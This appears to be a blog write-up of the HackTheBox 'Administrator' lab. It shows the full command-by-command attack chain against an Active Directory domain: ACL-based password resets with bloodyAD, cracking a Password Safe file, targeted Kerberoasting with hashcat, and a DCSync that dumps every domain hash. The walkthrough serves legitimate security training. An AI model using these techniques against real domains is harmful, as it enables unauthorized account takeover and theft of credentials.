---
title: "HTB - Administrator Writeup"
date: 2026-11-10 08:34:00 +0700
categories: [HackTheBox, Machines]
tags: [windows, medium]
---
Administrator is a medium-difficulty Windows machine designed around a complete domain compromise scenario, where credentials for a low-privileged user are provided. To gain access to the michael account, ACLs (Access Control Lists) over privileged objects are enumerated, leading us to discover that the user olivia has GenericAll permissions over michael, allowing us to reset his password. With access as michael, it is revealed that he can force a password change on the user benjamin, whose password is reset. This grants access to FTP where a backup.psafe3 file is discovered, cracked, and reveals credentials for several users. These credentials are sprayed across the domain, revealing valid credentials for the user emily. Further enumeration shows that emily has GenericWrite permissions over the user ethan, allowing us to perform a targeted Kerberoasting attack. The recovered hash is cracked and reveals valid credentials for ethan, who is found to have DCSync rights ultimately allowing retrieval of the Administrator account hash and full domain compromise.
## P0
First of all, I use rustscan to find out all opened ports:
```
└─$ rustscan -a 10.129.67.226 --ulimit 5000 --range 0-65535 --no-banner --scripts none
[~] Automatically increasing ulimit value to 5000.
Open 10.129.67.226:21
Open 10.129.67.226:53
Open 10.129.67.226:88
Open 10.129.67.226:135
Open 10.129.67.226:139
Open 10.129.67.226:445
Open 10.129.67.226:464
Open 10.129.67.226:593
Open 10.129.67.226:3268
Open 10.129.67.226:5985
Open 10.129.67.226:9389
Open 10.129.67.226:389
Open 10.129.67.226:47001
Open 10.129.67.226:49664
Open 10.129.67.226:49665
Open 10.129.67.226:49666
Open 10.129.67.226:49667
Open 10.129.67.226:49668
Open 10.129.67.226:50265
Open 10.129.67.226:50271
Open 10.129.67.226:50276
Open 10.129.67.226:50290
Open 10.129.67.226:50298
Open 10.129.67.226:50331
10.129.67.226 -> [21,53,88,135,139,445,464,593,3268,5985,9389,389,47001,49664,49665,49666,49667,49668,50265,50271,50276,50290,50298,50331]
```
Then I use nmap for getting details about them:
```
└─$ nmap -O -sV -sC -Pn --disable-arp-ping --traceroute -p21,53,88,135,139,445,464,593,3268,5985,9389,389,47001,49664,49665,49666,49667,49668,50265,50271,50276,50290,50298,50331 -oN 10.129.67.226_nmap 10.129.67.226
Starting Nmap 7.99 ( https://nmap.org ) at 2026-11-09 20:45 -0500
Nmap scan report for 10.129.67.226 (10.129.67.226)
Host is up (0.052s latency).

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-11-10 08:43:46Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb, Site: Default-First-Site-Name)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
50265/tcp open  msrpc         Microsoft Windows RPC
50271/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
50276/tcp open  msrpc         Microsoft Windows RPC
50290/tcp open  msrpc         Microsoft Windows RPC
50298/tcp open  msrpc         Microsoft Windows RPC
50331/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows 10 1703 or Windows 11 21H2 - 23H2 (97%), Microsoft Windows Server 2016 or Server 2019 (97%), Microsoft Windows 11 24H2 (97%), Microsoft Windows Server 2022 (96%), Microsoft Windows Server 2019 (95%), Microsoft Windows 11 24H2 - 25H2 (95%), Microsoft Windows Server 2012 or 2012 R2 (94%), Microsoft Windows 10 1703 (93%), Microsoft Windows 11 23H2 (93%), Microsoft Windows 10 1511 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: 6h58m37s
| smb2-time: 
|   date: 2026-11-10T08:44:49
|_  start_date: N/A

TRACEROUTE (using port 53/tcp)
HOP RTT      ADDRESS
1   39.22 ms 10.10.14.1 (10.10.14.1)
2   39.78 ms 10.129.67.226 (10.129.67.226)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 76.02 seconds
```

## P3 & P4
*As is common in real life Windows pentests, you will start the Administrator box with credentials for the following account: Username: Olivia Password: ichliebedich*.<br>

So I will directly use above credentials with **evil-winrm**
```
└─$ evil-winrm -i administrator.htb -u olivia -p ichliebedich  
```
From here, I continue with **SharpHound**:
```
*Evil-WinRM* PS C:\users\olivia> .\SharpHound.exe -c ALL
2026-11-10T01:17:48.1425465-08:00|INFORMATION|This version of SharpHound is compatible with the 5.0.0 Release of BloodHound
2026-11-10T01:17:48.1581712-08:00|INFORMATION|SharpHound Version: 2.14.0.0
2026-11-10T01:17:48.1581712-08:00|INFORMATION|SharpHound Common Version: 4.7.0.0
2026-11-10T01:17:48.2675594-08:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, UserRights, CARegistry, DCRegistry, CertServices, LdapServices, WebClientService, SmbInfo, NTLMRegistry
2026-11-10T01:17:48.2987888-08:00|INFORMATION|Initializing SharpHound at 1:17 AM on 11/10/2026
2026-11-10T01:17:48.3300381-08:00|INFORMATION|Resolved current domain to administrator.htb
2026-11-10T01:17:48.5956663-08:00|INFORMATION|Loaded cache with stats: 18 ID to type mappings.
 0 name to SID mappings.
 1 machine sid mappings.
 3 sid to domain mappings.
 0 global catalog mappings.
2026-11-10T01:17:48.5956663-08:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, UserRights, CARegistry, DCRegistry, CertServices, LdapServices, WebClientService, SmbInfo, NTLMRegistry
2026-11-10T01:17:48.6894150-08:00|INFORMATION|Beginning LDAP search for administrator.htb
2026-11-10T01:17:48.6894150-08:00|INFORMATION|Collecting AdminSDHolder data for administrator.htb
2026-11-10T01:17:48.7362914-08:00|INFORMATION|AdminSDHolder ACL hash 940B3A436DE3239FFBE20E63063FBDF286AA1031 calculated for administrator.htb.
2026-11-10T01:17:48.8144112-08:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for ADMINISTRATOR.HTB
2026-11-10T01:17:48.8144112-08:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for ADMINISTRATOR.HTB
2026-11-10T01:17:48.8144112-08:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for ADMINISTRATOR.HTB
2026-11-10T01:17:48.8300360-08:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for ADMINISTRATOR.HTB
2026-11-10T01:17:48.8300360-08:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for ADMINISTRATOR.HTB
2026-11-10T01:17:48.8300360-08:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for ADMINISTRATOR.HTB
2026-11-10T01:17:48.8300360-08:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for ADMINISTRATOR.HTB
2026-11-10T01:17:48.8300360-08:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for ADMINISTRATOR.HTB
2026-11-10T01:17:48.8300360-08:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for ADMINISTRATOR.HTB
2026-11-10T01:17:48.8300360-08:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for ADMINISTRATOR.HTB
2026-11-10T01:17:48.8300360-08:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for ADMINISTRATOR.HTB
2026-11-10T01:17:48.8456609-08:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for ADMINISTRATOR.HTB
2026-11-10T01:17:49.0331606-08:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for ADMINISTRATOR.HTB
2026-11-10T01:17:49.0331606-08:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for ADMINISTRATOR.HTB
2026-11-10T01:17:49.1112856-08:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for ADMINISTRATOR.HTB
2026-11-10T01:17:49.1112856-08:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for ADMINISTRATOR.HTB
2026-11-10T01:17:49.1112856-08:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for ADMINISTRATOR.HTB
2026-11-10T01:17:49.1112856-08:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for ADMINISTRATOR.HTB
2026-11-10T01:17:49.1269181-08:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for ADMINISTRATOR.HTB
2026-11-10T01:17:49.1269181-08:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for ADMINISTRATOR.HTB
2026-11-10T01:17:49.1269181-08:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for ADMINISTRATOR.HTB
2026-11-10T01:17:49.1269181-08:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for ADMINISTRATOR.HTB
2026-11-10T01:17:49.1425407-08:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for ADMINISTRATOR.HTB
2026-11-10T01:17:49.1425407-08:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for ADMINISTRATOR.HTB
2026-11-10T01:17:49.1425407-08:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for ADMINISTRATOR.HTB
2026-11-10T01:17:49.1425407-08:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for ADMINISTRATOR.HTB
2026-11-10T01:17:49.1425407-08:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for ADMINISTRATOR.HTB
2026-11-10T01:17:49.1581604-08:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for ADMINISTRATOR.HTB
2026-11-10T01:17:49.1581604-08:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for ADMINISTRATOR.HTB
2026-11-10T01:17:49.1581604-08:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for ADMINISTRATOR.HTB
2026-11-10T01:17:49.1737857-08:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for ADMINISTRATOR.HTB
2026-11-10T01:17:49.1737857-08:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for ADMINISTRATOR.HTB
2026-11-10T01:17:49.1737857-08:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for ADMINISTRATOR.HTB
2026-11-10T01:17:49.1894108-08:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for ADMINISTRATOR.HTB
2026-11-10T01:17:49.1894108-08:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for ADMINISTRATOR.HTB
2026-11-10T01:17:49.2050367-08:00|INFORMATION|Beginning LDAP search for administrator.htb Configuration NC
2026-11-10T01:17:49.2206624-08:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for ADMINISTRATOR.HTB
2026-11-10T01:17:49.4081618-08:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for ADMINISTRATOR.HTB
2026-11-10T01:17:49.4238018-08:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for ADMINISTRATOR.HTB
2026-11-10T01:17:49.4706624-08:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for ADMINISTRATOR.HTB
2026-11-10T01:17:49.4706624-08:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for ADMINISTRATOR.HTB
2026-11-10T01:17:49.4706624-08:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for ADMINISTRATOR.HTB
2026-11-10T01:17:49.4706624-08:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for ADMINISTRATOR.HTB
2026-11-10T01:17:49.4706624-08:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for ADMINISTRATOR.HTB
2026-11-10T01:17:49.4706624-08:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for ADMINISTRATOR.HTB
2026-11-10T01:17:49.4862861-08:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for ADMINISTRATOR.HTB
2026-11-10T01:17:49.4862861-08:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for ADMINISTRATOR.HTB
2026-11-10T01:17:49.4862861-08:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for ADMINISTRATOR.HTB
2026-11-10T01:17:49.4862861-08:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for ADMINISTRATOR.HTB
2026-11-10T01:17:49.4862861-08:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for ADMINISTRATOR.HTB
2026-11-10T01:17:49.4862861-08:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for ADMINISTRATOR.HTB
2026-11-10T01:17:50.4081707-08:00|INFORMATION|Producer has finished, closing LDAP channel
2026-11-10T01:17:50.4237863-08:00|INFORMATION|LDAP channel closed, waiting for consumers
2026-11-10T01:17:55.6737823-08:00|INFORMATION|Consumers finished, closing output channel
Closing writers
2026-11-10T01:17:55.7050337-08:00|INFORMATION|Output channel closed, waiting for output task to complete
2026-11-10T01:17:55.7675668-08:00|INFORMATION|Status: 300 objects finished (+300 42.85714)/s -- Using 55 MB RAM
2026-11-10T01:17:55.7675668-08:00|INFORMATION|Enumeration finished in 00:00:07.0925881
2026-11-10T01:17:55.8300324-08:00|INFORMATION|Saving cache with stats: 18 ID to type mappings.
 0 name to SID mappings.
 1 machine sid mappings.
 3 sid to domain mappings.
 0 global catalog mappings.
2026-11-10T01:17:55.8300324-08:00|INFORMATION|SharpHound Enumeration Completed at 1:17 AM on 11/10/2026! Happy Graphing!
```
Now time for us to be a detective !!!<br>

First of all, we have this flow: Olivia has **GenericAll** to Michael and Michael has **ForceChangePassword** on Benjamin.

![Upgrade_Notice.pdf](assets/image/htb/administrator/2026-11-10_10-48.png){: w="700" }

Next we find out that Ethan has **DcSync** on domain, really cool !

![Upgrade_Notice.pdf](assets/image/htb/administrator/2026-11-10_10-49.png){: w="700" }

Finally we get here Emily has **GenericWrite** on Ethan

![Upgrade_Notice.pdf](assets/image/htb/administrator/2026-11-10_10-50.png){: w="700" }

But....we have not yet found any connection between **Benjamin** and **Emily**. So just stop bloodhound here, we should continue to change password **Benjamin** account first and check whether we can find anything from it.

```
└─$ bloodyAD --host 10.129.67.226 -u 'olivia' -p 'ichliebedich' set password 'michael' 'NewPassword123!'    
[+] Password changed successfully!
```
```
└─$ bloodyAD --host 10.129.67.226 -u 'michael' -p 'NewPassword123!' set password 'benjamin' 'NewPassword123!'
[+] Password changed successfully!
```
Actually, I have tried **olivia** and **michael** with FTP on port 21 but both fail :D. But luckily, we succeed with **benjamin** and find out a strange file **Backup.psafe3**:
```
└─$ ftp 10.129.67.226
Connected to 10.129.67.226.
220 Microsoft FTP Service
Name (10.129.67.226:kali): benjamin
331 Password required
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||50910|)
125 Data connection already open; Transfer starting.
10-05-24  08:13AM                  952 Backup.psafe3
226 Transfer complete.
ftp> get Backup.psafe3
local: Backup.psafe3 remote: Backup.psafe3
229 Entering Extended Passive Mode (|||50912|)
125 Data connection already open; Transfer starting.
100% |**********************************|   952       19.22 KiB/s    00:00 ETA
226 Transfer complete.
WARNING! 3 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
952 bytes received in 00:00 (19.05 KiB/s)
```
After a few search on the Internet and make my hand dirty, I realize that **.psafe3** is a encrypted database file. So what if we could decrypt it ? So first I will convert it to john format:
```
└─$ pwsafe2john Backup.psafe3 > hash.txt
```
Then is the task of john to decrypt it:
```
└─$ john --wordlist=/mnt/hgfs/D/bb/pentest-tools/own-wordlist/rockyou.txt hash.txt --no-loader-dupecheck
No dupe-checking performed when loading hashes.
Using default input encoding: UTF-8
Loaded 1 password hash (pwsafe, Password Safe [SHA256 256/256 AVX2 8x])
Cost 1 (iteration count) is 2048 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tekieromucho     (Backu)     
1g 0:00:00:00 DONE (2026-11-09 22:42) 5.555g/s 45511p/s 45511c/s 45511C/s newzealand..whitetiger
Use the "--show" option to display all of the cracked passwords reliably
Session complet
```
Cool, we have found the password which is used for encrypting the file. So now is time for extract the data from that file:

![Upgrade_Notice.pdf](assets/image/htb/administrator/2026-11-10_10-45.png){: w="700" }

![Upgrade_Notice.pdf](assets/image/htb/administrator/2026-11-10_10-46.png){: w="700" }

Cool, we found the password of **emily** user, now we have connection between two flows which we have discussed in the bloodhound before.<br>

Because emily has **GenericWrite** on ethan, we can write a value to **servicePrincipalNam** field of ethan. After that we can continue with kerberoasting. For easily achving it, we can use nxc ldap with **--targeted-kerberoast** option:
```
└─$ nxc ldap 10.129.67.226 -u "emily" -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' -d administrator.htb --kerberoasting TGS_alfred.txt --targeted-kerberoast "ethan"
LDAP        10.129.67.226   389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb) (signing:None) (channel binding:No TLS cert)                                                                    
LDAP        10.129.67.226   389    DC               [+] administrator.htb\emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb 
LDAP        10.129.67.226   389    DC               [+] Found 1 enabled users without SPN.
LDAP        10.129.67.226   389    DC               [*] sAMAccountName: ethan, memberOf: [], pwdLastSet: 2024-10-12 16:52:14.117811, lastLogon: <never>
LDAP        10.129.67.226   389    DC               $krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb\ethan*$c316002a1016179f3060258783f7d42e$847798bf86a55905125044a0d8eaa00fc6c901b960e7d7cc1489b5cb5639e2d64cda26ee08df8eee3a3aca89d9378a43113737bdc118123c0696bcfaa967e7d0064aff2ad58039feabc0d2abcb4b37a75db610b6dbef5cf2d83a67fdd01fa2f4366d632ef327faf00923f19ff66fc16bba7aee0d144f0a8ce062beba14bf77569b1f3bce644ddedb80a54b3c3c3b5a3c24134502bf5ceb1331574fb10c540eda55e8ef22ffcff66640e2ba8e4f5bc7908fd2b2be8eee303f88d6fb4532220419432883c622ead7f5b0489252cb7a47908861b6336249cd322026be70eb981921d7d23024dbfb122a0a91a8b3786940283ba70d44a65c93c8b8cd89c49e295599e1fc43fe1929057b9cad2a331b5d35159bacb5880bc072313723644bb6799eb6ac6bdbd30420a0c48f0b8fd1583575e25210d110b8ce384fa6ee5e75d67ed2843d99b90d41b5bb5f7b86d4300492aa108f49af052e4368e33e6c90723e28147f077f64e7377f1e2518033205a0005e98d8876782e78a7e258c5b74dbbbd14b5808cb49ea89ad955238e0e48672eb69de96d7e536c97af51db83ac762f3d4237652f375c4e7a7f7aa83c99efee24da5a76db05a7d659a8fc19233cfdcf555f7359e439c1a70e08112bc171d93dab8a9699e2d1fc4ca7fd3793bd289c3a9267fa2013dc69b75798b2d87b9faea3ced2121370270193ea2195f37e4a48ed77faa8f39a9ab97e9532dc18fda9079e418ff425bae385239876ff129f7e4c67fbf6ed021451b9438b3d3cead429219346c46129fd74d6a38422dc3663cdc4db9c5e4e1a8ebf02a686c846c4fe1fc7f33328242a25375f1de5e560dc7febcd43648994712fc9208d2b74046308199533f730dd9aadae2f8f1815960d715371bf73b084d2c089c0802d78519cc1430268b262ff0f1bff43c55c775c9a270ccd376b3a43bc4b2da2a8e0bd27d04daf29bfc8e73f3c55d52dcd8653f31af8fae5f31460bd0a1337f751f1c5a12211446aeb9671d03702dab974ae3d1ae92b85b24f16467510964620fd897934e40de3425ddb4df2235bf460a8635a2c89b4aba4dd7ce08e8b8b0ec66134b651f01013e0681a6cd060699d8e5026855ab38e0cc433a26d0dbf4ae2d6627ea8e7f1cbee5074696df228aa6e512e82404a81a8cf433e3937529eafd8b21120a61ea7a041fb1830f57b6eda29a7a993a435908306ab874ceca42127ce0b2beb445ff6c0208b8c3e47cb21c32309d26400ac5fa614193e1cd171010856792b98e29b06b7f22253115776ed74d1dfbb7364c74a242eca9fc4dedcbba82ae43c3b06a79127ab82c482f4fda047df098162878eb0dd902516f5449e0eb510530b172c30f9ca28d4819776d9cec937e226c95a0b8c4ddf7e17de62fbab1f3418cc032aca72bb1b5441011aa12fb502b926aac5a7524d318f2411c36924c4e762bf7ef119df0530750bf642eeb8bd37761056b0d7669cc7959b9474c828c6ed0c74682b05108ffccd50aae6c2337de866682bd90d753c73bb38e7e44ac17a107e2f5547bb9d28f6ed8308d29
```
And finally, we can use hashcat to decrypt it:
```
.\hashcat.exe -a 0 -m 13100 '$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb\ethan*$c316002a1016179f3060258783f7d42e$847798bf86a55905125044a0d8eaa00fc6c901b960e7d7cc1489b5cb5639e2d64cda26ee08df8eee3a3aca89d9378a43113737bdc118123c0696bcfaa967e7d0064aff2ad58039feabc0d2abcb4b37a75db610b6dbef5cf2d83a67fdd01fa2f4366d632ef327faf00923f19ff66fc16bba7aee0d144f0a8ce062beba14bf77569b1f3bce644ddedb80a54b3c3c3b5a3c24134502bf5ceb1331574fb10c540eda55e8ef22ffcff66640e2ba8e4f5bc7908fd2b2be8eee303f88d6fb4532220419432883c622ead7f5b0489252cb7a47908861b6336249cd322026be70eb981921d7d23024dbfb122a0a91a8b3786940283ba70d44a65c93c8b8cd89c49e295599e1fc43fe1929057b9cad2a331b5d35159bacb5880bc072313723644bb6799eb6ac6bdbd30420a0c48f0b8fd1583575e25210d110b8ce384fa6ee5e75d67ed2843d99b90d41b5bb5f7b86d4300492aa108f49af052e4368e33e6c90723e28147f077f64e7377f1e2518033205a0005e98d8876782e78a7e258c5b74dbbbd14b5808cb49ea89ad955238e0e48672eb69de96d7e536c97af51db83ac762f3d4237652f375c4e7a7f7aa83c99efee24da5a76db05a7d659a8fc19233cfdcf555f7359e439c1a70e08112bc171d93dab8a9699e2d1fc4ca7fd3793bd289c3a9267fa2013dc69b75798b2d87b9faea3ced2121370270193ea2195f37e4a48ed77faa8f39a9ab97e9532dc18fda9079e418ff425bae385239876ff129f7e4c67fbf6ed021451b9438b3d3cead429219346c46129fd74d6a38422dc3663cdc4db9c5e4e1a8ebf02a686c846c4fe1fc7f33328242a25375f1de5e560dc7febcd43648994712fc9208d2b74046308199533f730dd9aadae2f8f1815960d715371bf73b084d2c089c0802d78519cc1430268b262ff0f1bff43c55c775c9a270ccd376b3a43bc4b2da2a8e0bd27d04daf29bfc8e73f3c55d52dcd8653f31af8fae5f31460bd0a1337f751f1c5a12211446aeb9671d03702dab974ae3d1ae92b85b24f16467510964620fd897934e40de3425ddb4df2235bf460a8635a2c89b4aba4dd7ce08e8b8b0ec66134b651f01013e0681a6cd060699d8e5026855ab38e0cc433a26d0dbf4ae2d6627ea8e7f1cbee5074696df228aa6e512e82404a81a8cf433e3937529eafd8b21120a61ea7a041fb1830f57b6eda29a7a993a435908306ab874ceca42127ce0b2beb445ff6c0208b8c3e47cb21c32309d26400ac5fa614193e1cd171010856792b98e29b06b7f22253115776ed74d1dfbb7364c74a242eca9fc4dedcbba82ae43c3b06a79127ab82c482f4fda047df098162878eb0dd902516f5449e0eb510530b172c30f9ca28d4819776d9cec937e226c95a0b8c4ddf7e17de62fbab1f3418cc032aca72bb1b5441011aa12fb502b926aac5a7524d318f2411c36924c4e762bf7ef119df0530750bf642eeb8bd37761056b0d7669cc7959b9474c828c6ed0c74682b05108ffccd50aae6c2337de866682bd90d753c73bb38e7e44ac17a107e2f5547bb9d28f6ed8308d29' ..\own-wordlist\rockyou.txt
$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb\ethan*$c316002a1016179f3060258783f7d42e$847798bf86a55905125044a0d8eaa00fc6c901b960e7d7cc1489b5cb5639e2d64cda26ee08df8eee3a3aca89d9378a43113737bdc118123c0696bcfaa967e7d0064aff2ad58039feabc0d2abcb4b37a75db610b6dbef5cf2d83a67fdd01fa2f4366d632ef327faf00923f19ff66fc16bba7aee0d144f0a8ce062beba14bf77569b1f3bce644ddedb80a54b3c3c3b5a3c24134502bf5ceb1331574fb10c540eda55e8ef22ffcff66640e2ba8e4f5bc7908fd2b2be8eee303f88d6fb4532220419432883c622ead7f5b0489252cb7a47908861b6336249cd322026be70eb981921d7d23024dbfb122a0a91a8b3786940283ba70d44a65c93c8b8cd89c49e295599e1fc43fe1929057b9cad2a331b5d35159bacb5880bc072313723644bb6799eb6ac6bdbd30420a0c48f0b8fd1583575e25210d110b8ce384fa6ee5e75d67ed2843d99b90d41b5bb5f7b86d4300492aa108f49af052e4368e33e6c90723e28147f077f64e7377f1e2518033205a0005e98d8876782e78a7e258c5b74dbbbd14b5808cb49ea89ad955238e0e48672eb69de96d7e536c97af51db83ac762f3d4237652f375c4e7a7f7aa83c99efee24da5a76db05a7d659a8fc19233cfdcf555f7359e439c1a70e08112bc171d93dab8a9699e2d1fc4ca7fd3793bd289c3a9267fa2013dc69b75798b2d87b9faea3ced2121370270193ea2195f37e4a48ed77faa8f39a9ab97e9532dc18fda9079e418ff425bae385239876ff129f7e4c67fbf6ed021451b9438b3d3cead429219346c46129fd74d6a38422dc3663cdc4db9c5e4e1a8ebf02a686c846c4fe1fc7f33328242a25375f1de5e560dc7febcd43648994712fc9208d2b74046308199533f730dd9aadae2f8f1815960d715371bf73b084d2c089c0802d78519cc1430268b262ff0f1bff43c55c775c9a270ccd376b3a43bc4b2da2a8e0bd27d04daf29bfc8e73f3c55d52dcd8653f31af8fae5f31460bd0a1337f751f1c5a12211446aeb9671d03702dab974ae3d1ae92b85b24f16467510964620fd897934e40de3425ddb4df2235bf460a8635a2c89b4aba4dd7ce08e8b8b0ec66134b651f01013e0681a6cd060699d8e5026855ab38e0cc433a26d0dbf4ae2d6627ea8e7f1cbee5074696df228aa6e512e82404a81a8cf433e3937529eafd8b21120a61ea7a041fb1830f57b6eda29a7a993a435908306ab874ceca42127ce0b2beb445ff6c0208b8c3e47cb21c32309d26400ac5fa614193e1cd171010856792b98e29b06b7f22253115776ed74d1dfbb7364c74a242eca9fc4dedcbba82ae43c3b06a79127ab82c482f4fda047df098162878eb0dd902516f5449e0eb510530b172c30f9ca28d4819776d9cec937e226c95a0b8c4ddf7e17de62fbab1f3418cc032aca72bb1b5441011aa12fb502b926aac5a7524d318f2411c36924c4e762bf7ef119df0530750bf642eeb8bd37761056b0d7669cc7959b9474c828c6ed0c74682b05108ffccd50aae6c2337de866682bd90d753c73bb38e7e44ac17a107e2f5547bb9d28f6ed8308d29:limpbizkit
```
Cool, now we have credentials of **ethan** user.<br>
Oh I forgot, we can use **emily** to winrm and find the first flag:
```
*Evil-WinRM* PS C:\Users\emily\Desktop> ls


    Directory: C:\Users\emily\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        10/30/2024   2:23 PM           2308 Microsoft Edge.lnk
-ar---        11/10/2026  12:33 AM             34 user.txt


*Evil-WinRM* PS C:\Users\emily\Desktop> type user.txt
```
Okey, now use **ethan** user to make a **dcsync** and achive administrator hash.
```
─$ impacket-secretsdump -just-dc ADMINISTRATOR/ethan@10.129.67.226
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::
administrator.htb\olivia:1108:aad3b435b51404eeaad3b435b51404ee:fbaa3e2294376dc0f5aeb6b41ffa52b7:::
administrator.htb\michael:1109:aad3b435b51404eeaad3b435b51404ee:0ef3298edfc59e0cd07c56d829eea9c6:::
administrator.htb\benjamin:1110:aad3b435b51404eeaad3b435b51404ee:0ef3298edfc59e0cd07c56d829eea9c6:::
administrator.htb\emily:1112:aad3b435b51404eeaad3b435b51404ee:eb200a2583a88ace2983ee5caa520f31:::
administrator.htb\ethan:1113:aad3b435b51404eeaad3b435b51404ee:5c2b9f97e0620c3d307de85a93179884:::
administrator.htb\alexander:3601:aad3b435b51404eeaad3b435b51404ee:cdc9e5f3b0631aa3600e0bfec00a0199:::
administrator.htb\emma:3602:aad3b435b51404eeaad3b435b51404ee:11ecd72c969a57c34c819b41b54455c9:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:cf411ddad4807b5b4a275d31caa1d4b3:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:9d453509ca9b7bec02ea8c2161d2d340fd94bf30cc7e52cb94853a04e9e69664
Administrator:aes128-cts-hmac-sha1-96:08b0633a8dd5f1d6cbea29014caea5a2
Administrator:des-cbc-md5:403286f7cdf18385
krbtgt:aes256-cts-hmac-sha1-96:920ce354811a517c703a217ddca0175411d4a3c0880c359b2fdc1a494fb13648
